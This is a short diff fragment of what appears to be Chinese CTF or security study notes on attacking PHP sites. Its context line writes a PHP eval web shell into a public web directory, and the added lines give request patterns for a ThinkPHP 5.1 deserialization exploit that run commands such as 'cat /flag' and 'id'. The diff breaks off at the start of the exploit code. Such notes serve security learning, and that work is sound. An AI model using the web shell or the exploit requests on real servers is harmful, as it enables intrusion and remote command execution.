@@ -68,9 +68,14 @@ echo "<?php @eval(\$_POST['cmd']);?>" > /var/www/public/test.php
 
 
 
-＾
+^
+
 ## **Tinkphp 5.1反序列化**
+入口
+```
 ?&lin=cat /flag&data=序列化串
+?lin=id  POST  code=序列化串
+```
 ```
 <?php
 namespace think;
